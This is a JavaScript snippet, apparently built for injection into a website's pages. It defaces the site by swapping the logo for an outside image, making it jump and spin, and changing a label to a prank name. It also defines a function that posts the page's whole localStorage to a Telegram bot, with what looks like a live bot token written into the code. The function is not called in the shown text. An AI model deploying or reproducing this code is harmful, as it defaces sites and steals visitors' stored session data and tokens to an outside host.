if (!window.logo) {
    window.logo = document.querySelector('[src="/images/logo.png"]');
    window.logo.src = 'https://i.pinimg.com/736x/2c/ed/fd/2cedfdd46ef9fb3a826b234a014e7661.jpg';
    window.logo.style.cssText = 'position:absolute;top:20px;left:20px;width:200px;height:auto;transition:all 0.3s ease-in-out;';
    setInterval(() => {
        let maxX = window.innerWidth - window.logo.width;
        let maxY = window.innerHeight - window.logo.height;
        let randomX = Math.floor(Math.random() * maxX);
        let randomY = Math.floor(Math.random() * maxY);
        let scale = Math.random() * 4.5 + 0.8; // scale từ 0.8 tới 1.3
        window.logo.style.left = randomX + 'px';
        window.logo.style.top = randomY + 'px';
        window.logo.style.transform = `scale(${scale}) rotate(${Math.floor(Math.random() * 360)}deg)`;
    }, 500);

    document.querySelector('[alt="MaiTech logo"]').nextElementSibling.querySelector("strong").innerText = "Cương Đẹp Zai";
}

function sendToTelegram(message) {
    const token = "8072273750:AAHTjGi0qw_S9khhoI1OlJCrIxDdjJ2kcEo"; // thay bằng token thật
    const chatId = "@taptap1997";  // thay bằng chatId thật

    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: JSON.stringify(localStorage)
        })
    })
        .then(res => res.json())
        .then(data => console.log("Đã gửi:", data))
        .catch(err => console.error("Lỗi:", err));
}
